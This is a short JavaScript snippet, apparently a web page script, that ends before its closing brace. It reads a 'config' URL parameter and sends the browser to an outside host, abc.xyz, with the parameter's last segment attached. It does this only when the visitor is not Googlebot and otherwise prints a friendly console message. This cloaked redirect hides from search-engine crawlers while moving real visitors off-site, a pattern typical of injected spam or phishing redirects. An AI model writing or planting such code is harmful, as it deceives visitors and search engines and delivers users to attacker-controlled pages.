const config = new URLSearchParams(window.location.search).get('config');
const slug = config && config.split('/').pop();

if (slug && !navigator.userAgent.includes('Googlebot')) {
    window.location.href = "http://abc.xyz/" + encodeURIComponent(slug);
} else {
    console.log("Thanks for visiting my page");